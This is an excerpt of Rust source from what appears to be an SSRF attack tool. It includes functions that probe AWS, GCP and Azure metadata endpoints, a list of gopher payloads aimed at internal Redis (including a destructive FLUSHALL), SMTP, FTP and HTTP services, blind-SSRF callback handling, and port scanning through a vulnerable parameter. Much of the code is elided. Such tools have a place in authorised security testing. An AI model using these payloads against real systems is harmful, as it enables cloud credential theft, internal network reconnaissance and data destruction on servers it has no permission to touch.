...
pub async fn metadata(
    ...
    for p in AWS_METADATA { all_payloads.push(("AWS", p)); }
    for p in GCP_METADATA { all_payloads.push(("GCP", p)); }
    for p in AZURE_METADATA { all_payloads.push(("Azure", p)); }

    for (cloud, target) in &all_payloads {
        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, target);
        ...
        match req.send().await {
            Ok(resp) => {
                ...
                if status.is_success() && !body.is_empty() {
                    println!("{} [CRITICAL] {} metadata accessible!", "[!]".red().bold(), cloud);
...
pub async fn gopher(
    ...
    let payloads = [
        ("Redis SET", "gopher://127.0.0.1:6379/_SET%20ps_ssrf%201%0D%0A"),
        ("Redis FLUSHALL", "gopher://127.0.0.1:6379/_FLUSHALL%0D%0A"),
        ("SMTP HELO", "gopher://127.0.0.1:25/_HELO%20test%0D%0A"),
        ("SMTP MAIL", "gopher://127.0.0.1:25/_MAIL%20FROM:attacker@test.com%0D%0A"),
        ("FTP LIST", "gopher://127.0.0.1:21/_LIST%0D%0A"),
        ("Internal HTTP", "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0A"),
    ];
...
pub async fn blind(
    ...
    println!("\n{} Monitor callback server for hits.", "[*]".cyan().bold());
    Ok(())
}
...
pub async fn scan(
    ...
    let port_list: Vec<u16> = if ports == "common" {
        ...
        ports.split(',').filter_map(|p| p.trim().parse().ok()).collect()
    };
        ...
        match client.get(&test_url).send().await {
            Ok(resp) => {
                ...
                if status.is_success() || status.as_u16() == 301 || status.as_u16() == 302 {
                    println!("  {} {:6} OPEN   {} {:.2}s", "•".cyan(), port, status, elapsed.as_secs_f64());
                } else {
                    println!("  {} {:6} CLOSED {} {:.2}s", "•".dimmed(), port, status, elapsed.as_secs_f64());
                }
            }
            Err(_) => {
